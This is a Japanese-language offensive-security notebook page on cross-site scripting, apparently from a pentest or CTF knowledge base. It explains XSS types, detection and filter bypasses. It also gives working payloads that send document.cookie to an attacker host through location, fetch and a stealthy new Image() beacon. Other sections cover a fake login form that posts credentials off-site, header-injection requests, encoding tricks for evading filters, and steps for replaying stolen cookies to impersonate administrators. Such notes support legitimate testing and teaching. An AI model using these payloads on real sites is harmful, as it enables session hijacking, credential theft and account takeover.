# クロスサイトスクリプティング（XSS）

## 概要

WebアプリケーションのユーザーインターフェースにJavaScriptを注入し、被害者のブラウザ上で実行させる脆弱性。ユーザー生成コンテンツの不適切なサニタイズが原因。セッショントークン窃取・フィッシングリダイレクト・DOM偽装など多様な悪用につながる。

---

## 着火条件

- コメント欄・検索バー・プロフィール入力などユーザー入力が HTML としてページに反映される箇所がある
- 入力値がエスケープ処理されずそのままページに埋め込まれる
- URL パラメータや HTTP レスポンスヘッダーに入力値が反射される

---

## 観点・着眼点

**先に確認すること：CookieスティーリングはHTTPOnly属性の確認が前提：**

ブラウザ DevTools の Application → Cookies タブで対象Cookieの HTTPOnly 列を確認する。

| HTTPOnly の状態 | 次のアクション |
|---------------|-------------|
| **付いている** | `document.cookie` での取得は不可 → DOM偽装・フィッシングリダイレクト・CSRF補助に切り替える |
| **付いていない** | Cookieスティーリングが有効 → 以下の手順へ進む |

---

**先に確認すること：本文がフィルタされたら、リクエストヘッダーが反射されていないか確認する：**

`<script>alert(1)</script>` を本文に入れて「不正な入力です」「Hacking attempt detected」のようなエラーページが返ってきた場合、**そのエラーページ自身が攻撃面になっていることが多い。** サーバーが「攻撃を検知したので情報を管理者に送信した」旨を表示する設計のとき、画面に **クライアントのリクエストヘッダー（Method / URL / User-Agent / Referer / Cookie 等）がそのまま反射される**ケースがある。

| エラーページに見える要素 | 意味 | 次のアクション |
|--------------------|-----|-------------|
| `User-Agent: Mozilla/...` などリクエストヘッダーが本文として表示される | ヘッダー値はサニタイズせず HTML に埋め込んでいる | User-Agent / Referer / X-Forwarded-For / X-Real-IP を `<script>` 入りに差し替えて再送 |
| 「report has been sent to the administrator」「flagged for review」等の文言 | 管理者がレポートを後から閲覧する設計 → **Blind XSS の発火条件が成立** | ヘッダー注入経路 + Blind XSS（cookie exfil）を組み合わせる |
| 本文だけ消され、フォーム入力以外（ヘッダー）はそのまま | フィルタはフォームフィールドにしかかかっていない | ヘッダー注入が刺さる確率が高い |

**攻撃者の思考トレース：** 「本文 input は弾かれた → HTML 出力経路自体に対して **どの値が反射されているか**を確認する」。フォームのフィールド名以外で画面に出てくる文字列（IPアドレス・UA・リクエスト時刻・URL）はすべてヘッダー由来の可能性があり、サニタイズが甘いことが多い。

---

**XSS のタイプと検出シグナル：**

| タイプ | 条件 | 着眼点 |
|------|------|--------|
| 反射型（Reflected） | 入力値がそのままレスポンスに反射される | URL パラメータ・検索結果・エラーメッセージ |
| 格納型（Stored） | 入力値がサーバーに保存され他ユーザーに表示される | コメント欄・メッセージ機能・ユーザープロフィール |
| DOM型（DOM-based） | クライアントサイドの JS が URL フラグメントを直接 DOM に書き込む | `document.write()` / `innerHTML` の使用箇所 |
| **mXSS（Mutation XSS）** | サニタイズ後の文字列が `innerHTML` 等に代入された瞬間、ブラウザの HTML パーサが DOM ツリーを構築・修正する過程でサニタイザの検査を抜けたパターンに mutate する | DOMPurify / sanitize-html などのライブラリ + `innerHTML` 代入の組合せ。`<noscript>` / `<template>` / `<math>` / `<svg>` のネスト・属性 quote の引き直し・SVG foreignObject の解釈境界での再パースが典型 mutation 点 |
| **Blind XSS** | 入力値はその場で反射されないが、後で別のユーザー（管理者等）のブラウザで読まれる | お問い合わせフォーム・サポートチケット・ログ閲覧画面・管理者向けレポート画面 |

**mXSS の確認手順:**

1. 対象がサニタイズライブラリ（DOMPurify 等）を使っているか確認（JS バンドルを grep）
2. サニタイズ後の文字列が `innerHTML` / `outerHTML` / `document.write()` 経由で DOM に注入されているかを確認（`textContent` ならパースされないので OK）
3. 上記 2 が揃ったら、Cure53 の mXSS PoC（`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`）のような mutation 系ペイロードを順に試す
4. DOMPurify の version を確認（`DOMPurify.version`）し、当該 version の既知 mXSS bypass が公開されているか確認

**現代的な DOM XSS の入口（prototype pollution）:**

`__proto__` / `constructor.prototype` 経由でグローバルオブジェクトプロトタイプを汚染し、後段で**ユーザー制御不能と思われていたプロパティが汚染値を返すようになる**ことで XSS sink にたどり着く経路。jQuery `$.extend(true, ...)`・lodash `_.merge` の古いバージョン・自前の deep merge 関数が汚染源として典型。

```js
// [Attacker] 例: ?__proto__[srcdoc]=<img src=x onerror=alert(1)> 等のクエリで Object.prototype を汚染
// 後段で iframe を生成する処理が「srcdoc が未指定なら default」というロジックを持っていると
// プロトタイプ汚染値が iframe.srcdoc に流入して XSS 発火
```

確認手順は JS バンドルから `$.extend\(.*true` / `_.merge` / 自前 deep merge / `Object.assign({}, ...)` を順に grep して、ユーザー入力が経路に乗っているかを追う。詳細経路は静的解析でも見つかりにくいため、source map がある場合は活用する。

**Blind XSS の発火シグナル：**

| 観測される文言・挙動 | 意味 | 次のアクション |
|------------------|------|-------------|
| 「メッセージを管理者に送信しました」 | 管理者のブラウザで開かれる可能性 | Blind XSS ペイロード送信 → リスナーで callback を待つ |
| 「不正な入力を検出しました。管理者に通知しました」 | 管理者用レポート画面に reflect される設計 | 同上。本文だけでなくヘッダーも併せて注入 |
| 投稿内容がその場では見えないが、後で運用者が確認する性質の機能（問い合わせ・苦情・サポート） | 管理者ブラウザで HTML 化されて表示される可能性 | 同上 |

**コードレビュー観点：フレームワーク固有の XSS sink パターン**

ソースコードにアクセスできる場合（OSS・ソースコードレビュー）は以下のパターンを grep する。
流入する値がユーザー制御可能かどうかをコードを遡って確認する。

| コード | 安全か | 理由 |
|------|--------|------|
| `element.innerHTML = userInput` | ❌ 危険 | HTML として解釈される |
| `$(elem).html(userInput)` | ❌ 危険 | jQuery `.html()` = `innerHTML` と同義 |
| `element.textContent = userInput` | ✅ 安全 | テキストとして扱われる（HTML タグは文字列化） |
| `$(elem).text(userInput)` | ✅ 安全 | jQuery `.text()` = `textContent` と同義 |
| React `<div>{userInput}</div>` | ✅ 安全 | JSX の `{}` はデフォルトで自動エスケープ |
| React `dangerouslySetInnerHTML={{__html: userInput}}` | ❌ 危険 | 名称通り意図的に HTML として注入する |

```bash
# [Attacker] 危険な sink を grep で一括探索（TypeScript / JavaScript 対象）
grep -rn "\.html(" src/ --include="*.ts" --include="*.js"
grep -rn "innerHTML\s*=" src/ --include="*.ts" --include="*.js"
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
```

**攻撃者の思考トレース：** `.html(` `innerHTML =` `dangerouslySetInnerHTML` の grep ヒットを確認したら、「そこに流れ込む値がユーザー制御可能か」をコードを遡る。サーバー API からの戻り値（`apiResponse.[USER_FIELD]` や `data.[USER_FIELD]` 等、ユーザーが書き込めるテキスト系プロパティ）がそのまま sink に代入されていれば XSS 候補として記録する。よくあるユーザー制御フィールドの例：タイトル / 名前 / 表示名 / コメント本文 / 説明文 / プロフィール文字列。

> 原理と各フレームワークの詳細 → `../../06_Concepts/Electron_Security.md`（Electron の場合の RCE への昇格条件も記載）

---

**優先的に確認するフィールド：**

- 検索バー（入力がそのままページに表示されやすい）
- コメント・フォーラム投稿（格納型の典型）
- エラーメッセージに入力値が含まれる箇所
- プロフィール名・ユーザー設定（他ユーザーの画面に表示される）
- **問い合わせフォーム・サポートチケット・「不正検知レポート」画面（Blind XSS の典型）**
- **リクエストヘッダーが反射されるエラーページ（フィルタ回避面として）**

**出力の「何かが変わったか」を観察する：**

- `<b>test</b>` を入力してページ上で太字になる → HTML として解釈されている
- `<script>` タグが除去されていてもイベントハンドラが通るケースが多い
- エラーが出ずに入力が消える → サーバー側でフィルタされている可能性

---

## 手順

### 基本的な動作確認

```html
<!-- HTML タグが解釈されるか確認 -->
<b>test</b>

<!-- JavaScript が実行されるか確認 -->
<script>alert(1)</script>

<!-- script タグがフィルタされる場合：イベントハンドラ経由 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 攻撃側の準備

Cookieやデータをテスター端末で受け取るためのリスナーを事前に起動しておく。

```bash
# [Attacker] 簡易HTTPサーバーで受け取る（ログにクエリ文字列が出力される）
python3 -m http.server 8000

# [Attacker] 自分のIPアドレスを確認する
ip a | grep "inet " | grep -v 127.0.0.1
```

> リバースシェルとの違い・攻撃側インフラの概念 → `../../06_Concepts/Reverse_Shell.md`

### リクエストヘッダー経由の注入（フォーム本文がフィルタされた場合）

WAF / アプリ側のフィルタが**フォームのフィールド名にしかかかっていない**ケースが多い。エラーページにリクエストヘッダーが反射されているのを観測したら、ヘッダー側に `<script>` を入れて再送する。

ローカルプロキシ（Burp Suite / mitmproxy / Caido 等）でリクエストを傍受し、ヘッダー値を差し替えてから forward する。

```http
POST /[ENDPOINT] HTTP/1.1
Host: [TARGET]
User-Agent: <script>alert(1)</script>
...

[FORM_BODY]
```

**狙うヘッダーの優先順：**
1. `User-Agent`（最も反射されやすい）
2. `Referer`
3. `X-Forwarded-For` / `X-Real-IP`（フロントの WAF/LB が IP をログに残す設計でよく反射）
4. `Cookie`（自分の Cookie 値に注入。反射確認用に limited だがフィルタ回避テストに有効）

### セッショントークン窃取（Cookie スティーリング）

```html
<!-- document.location 経由（被害者が画面遷移するため気付かれやすい） -->
<script>document.location='http://[ATTACKER_HOST]/?c='+document.cookie</script>

<!-- img タグ経由（script タグ禁止の場合） -->
<img src=x onerror="fetch('http://[ATTACKER_HOST]/?c='+document.cookie)">

<!-- new Image() ステルスチャネル（画面遷移なし・コンソールにも痕跡が残りにくい。Blind XSS で推奨） -->
<script>var i=new Image(); i.src="http://[ATTACKER_HOST]/?c="+btoa(document.cookie);</script>
```

**`new Image()` を使う理由（Blind XSS の文脈で重要）：**

- 画面遷移しない → 被害者ブラウザに表示変化が出ない（管理者が異常に気付きにくい）
- DevTools の Network タブには出るが、`<img>` 由来として混ざるため目視では見落とされやすい
- `btoa()` で base64 化することで URL に `=` `;` などの特殊文字を含む Cookie をそのまま送れる

### Blind XSS の callback 受信と Cookie の復号

**事前準備（必須）：** ペイロードを送る前に、攻撃側（テスター端末）で受信用 HTTP サーバーを起動しておく。

```bash
# [Attacker] 受信用リスナー（任意ポート、443/80 はEgressを通りやすい）
python3 -m http.server 8000

# [Attacker] 自分の到達可能 IP を確認（環境によって物理 LAN / VPN / 拠点ルータ等異なる）
ip a | grep "inet " | grep -v 127.0.0.1
```

**callback 受信例（base64 化して送らせた場合）：**

```
[ATTACKER_IP] - - [DATE] "GET /?c=aXNfYWRtaW49Im[...]= HTTP/1.1" 200 -
```

**受信後の base64 デコード：**

```bash
# [Attacker] base64 -d で平文に戻す
echo "aXNfYWRtaW49Im[...]=" | base64 -d
# 例: is_admin=ImFkbWluIg.[SIGNATURE]
```

**着眼点：**

- 自分のセッションが先に届く（XSS 投稿時に自分が一度ロード → 自分の Cookie）。**1件目は捨てて2件目以降の Cookie を狙う**
- callback の `User-Agent` が自分のブラウザと違う → 別ユーザー（管理者）のブラウザでロードされた証拠
- 受信元 IP が自分以外 → 同上
- callback が来ない → ペイロードが管理者ブラウザに届く経路にない / CSP で外部リクエストが遮断されている / `<script>` がフィルタされている

### 取得した Cookie で別ユーザーになりすます

Cookie が手に入ったら、自分のブラウザに「植え替えて」アクセスするか、`curl`/Burp で `Cookie` ヘッダーを差し替える。

**ブラウザで植え替える（Firefox / Chromium DevTools）：**

1. ブラウザ右クリック → **Inspect Element**
2. **Storage（Firefox）** または **Application → Storage → Cookies（Chromium 系）** タブを開く
3. 対象ドメインを選び、Cookie 名（例: `is_admin`, `session`）の **Value** をダブルクリック
4. 取得した Cookie 値を貼り付けて Enter
5. 該当ページをリロード → 別ユーザー（管理者）として表示される

**注意：** `path` / `domain` / `Secure` / `SameSite` 属性が元 Cookie と一致していないと送信されない。元の値をそのまま上書きする運用が安全。

**curl / Burp Repeater で差し替える：**

```bash
# [Attacker] Cookie ヘッダーを直接指定して任意のエンドポイントにアクセス
curl -s http://[TARGET]/dashboard -H "Cookie: [COOKIE_NAME]=[STOLEN_COOKIE_VALUE]"
```

Burp Repeater の場合は元リクエストの `Cookie:` 行を差し替えて Send。
セッションが生きていれば、元ユーザーがログアウトするまで使える。

### DOM 偽装・フィッシングリダイレクト

```html
<!-- 偽ログインフォームを挿入してDOMを書き換える -->
<script>
document.body.innerHTML='<form action="http://[ATTACKER_HOST]/capture">Username:<input name="u"><br>Password:<input type="password" name="p"><input type="submit"></form>';
</script>

<!-- 別のフィッシングサイトへ自動転送 -->
<script>window.location='http://[PHISHING_SITE]'</script>
```

### 入力バイパス（エンコーディング・難読化）

フィルタが存在する場合は以下を組み合わせて回避する。

| フィルタの種類 | 回避手法 |
|------------|---------|
| `<script>` をブロック | イベントハンドラ（`onerror` / `onload` / `onclick`）を使う |
| `alert` をブロック | `confirm(1)` / `prompt(1)` で代替確認 |
| 引用符をエスケープ | HTML エンコーディング（`&quot;` / `&#34;`）/ URL エンコーディング（`%22`） |
| キーワード一致フィルタ | 大文字小文字混在（`<sCrIpT>`）/ ダブルエンコーディング（`%253C`） |
| `javascript:` をブロック | `data:text/html` スキーマや `vbscript:` に切り替える |

**エンコーディング・難読化の基本戦略：**

- HTML エンコーディング：`<` → `&lt;`、`>` → `&gt;`、`"` → `&quot;`
- URL エンコーディング：`<` → `%3C`、`>` → `%3E`
- ダブルエンコーディング：`<` → `%253C`（サーバーとブラウザで2回デコードされる経路に有効）
- 上記を組み合わせてフィルタの検出をすり抜ける

---

## 主な悪用シナリオ

| シナリオ | 手法 | 影響 |
|--------|------|------|
| セッションハイジャック | Cookie を攻撃者サーバーに送信 | アカウント乗っ取り |
| フィッシングリダイレクト | `document.location` で偽サイトに転送 | 認証情報窃取 |
| DOM 偽装（UI 偽装） | DOM 操作でフォームや表示内容を差し替え | ユーザー誘導・認証情報窃取 |
| CSRF トークン窃取 | ページ内のトークンを読み取り攻撃者に送信 | CSRF 攻撃の補助 |
| キーロガー | `addEventListener('keydown', ...)` でキー入力を記録 → 攻撃者ホストへ送信 | パスワード・クレジットカード情報窃取。ただし**ペイロード注入後に被害者がページに留まり続ける必要**があり、SPA でルーティングが切り替わる / 別ページに遷移する / リロードされると失効する。実用化には Stored XSS で**継続的に表示されるページ**（ダッシュボード等）への注入が前提。Reflected XSS では効果が薄い |

---

## 刺さらなかったとき

| 観測される症状 | 推定原因 | 代替手段 |
|--------------|---------|---------|
| 本文 `<script>` が弾かれる | フォーム入力にフィルタ | リクエストヘッダー（User-Agent / Referer）に注入を移す |
| ヘッダー注入も画面上に反射されない | ヘッダー値はサニタイズされている | Stored / Blind XSS が使えるエンドポイントを探す（投稿系・ログ閲覧系） |
| Blind XSS の callback が一切来ない | 管理者画面に届いていない / CSP で外部接続遮断 / `<script>` がフィルタ | `<img onerror=...>` 経由に切替・受信用 IP/Port を 80/443 に変更・期間を空けて待つ（管理者の閲覧頻度依存） |
| callback は来たが Cookie 値が空 | HTTPOnly が付いている | DOM 偽装・フィッシングリダイレクト・CSRF 補助に切替 |
| Cookie を植え替えてもログイン画面に戻る | 元 Cookie の `path` / `Secure` / `SameSite` が一致していない or サーバー側に追加の Bearer / CSRF トークンが必要 | DevTools で Cookie 全属性を一致させる・必要なヘッダー（Authorization 等）も合わせて差し替える |
| Cookie はセットされているが管理者ページが 403 | Cookie だけでなくセッション内部の権限フラグが別管理 | パラメータ改ざん（IDOR / Broken Function Level Auth）に切り替える |

## 注意点・落とし穴

- **HTTPOnly Cookie が設定されていると `document.cookie` では取得できない**：セッショントークン窃取の代わりに DOM 操作・フィッシングリダイレクト・CSRF を狙う
- **CSP（Content Security Policy）が有効な場合**：`script-src` の制限で外部スクリプト読み込みが防がれる。CSP ヘッダーの `unsafe-inline` が許可されているかどうかを先に確認する。`nonce-...` / `strict-dynamic` 構成では既存スクリプトの後段から JS を実行する gadget（`<script nonce="...">` の中身を XSS 経由で書き換える経路）が必要
- **Trusted Types（Chrome / Edge / Firefox 137+）**：`Content-Security-Policy: require-trusted-types-for 'script'` ヘッダがあると、`element.innerHTML = userInput` / `eval(userInput)` 等の DOM XSS sink が **TypeError で実行ブロックされる**（ポリシーで wrap されていない文字列を sink が拒否）。Trusted Types policy が定義されていれば policy 関数を経由した値しか sink に渡せないため、DOM XSS の通常ペイロードは弾かれる。**Trusted Types は HTML / 反射型 / 格納型 XSS には効かない**（サーバ側 HTML 出力に対しては効かない）。CSP report-only モードで配信中の場合は実害は出ないが将来ブロック化される予兆として記録
- **格納型 XSS は影響範囲が広い**：脆弱なフィールドに保存されたペイロードはそのページを閲覧した全ユーザーに影響する。管理者が閲覧するページに格納できれば高権限への昇格につながる
- **バイパスは単一手法では不十分なことが多い**：エンコーディング・イベントハンドラ・タグ種類を組み合わせて試す
- **Blind XSS は callback が来るまで時間がかかる**：管理者の閲覧タイミング依存。複数ペイロードを送る前に十分待つ（数分〜数十分）。受信用ポートは 80/443 に寄せると Egress を通りやすい
- **callback で 1件目に届く Cookie は自分のもの**：自分が投稿時に一度ロードされるため。**2件目以降を見る**
- **stolen Cookie の使い回しはセッションが切れるまで**：管理者がログアウトすると無効化される。取得したらすぐに必要な操作を済ませる
- **ヘッダー注入は POST/GET 両方に有効**：URL クエリ経由で Referer に乗せる手も使える

---

## 関連技術

- 前：ユーザー入力がHTMLとして反映される箇所を発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：エラーページにリクエストヘッダーが反射される設計を観測 → 本ファイル「先に確認すること」のヘッダー注入経路
- 後：HTTPOnly未設定のCookieが取得できた → 管理者セッションで隠しエンドポイント（管理画面・dashboard）にアクセス → `../../01_Reconnaissance/Web_Enumeration.md`（ディレクトリ列挙）
- 後：管理画面で別の入力点を発見 → `./Command_Injection.md`（管理者専用APIにコマンドインジェクションがある典型パターン）
- 後：格納型XSSで管理者が閲覧するページに注入できた → 管理者セッション取得 → `../Credential_Discovery.md`
- 関連：SQLi（同じ入力フィールドの脆弱性・バイパス手法が重複） → `./SQLi.md`
- 関連：SSRF（入力値がサーバー側リクエストになる経路） → `./SSRF.md`
- 関連：LLM 出力経由の XSS（Improper Output Handling） → `../../06_Concepts/AI_ML/Generative_AI/LLM_Attacks.md`
- 関連：攻撃側の準備（リスナー起動・到達可能 IP の確認） → `../../06_Concepts/Reverse_Shell.md`
- 後：Electron デスクトップアプリで XSS が発火する環境 → XSS が RCE に到達する可能性 → `./Electron_XSS_RCE.md`
- 関連：Electron の nodeIntegration / contextIsolation の原理・各フレームワークの XSS 対策詳細 → `../../06_Concepts/Electron_Security.md`
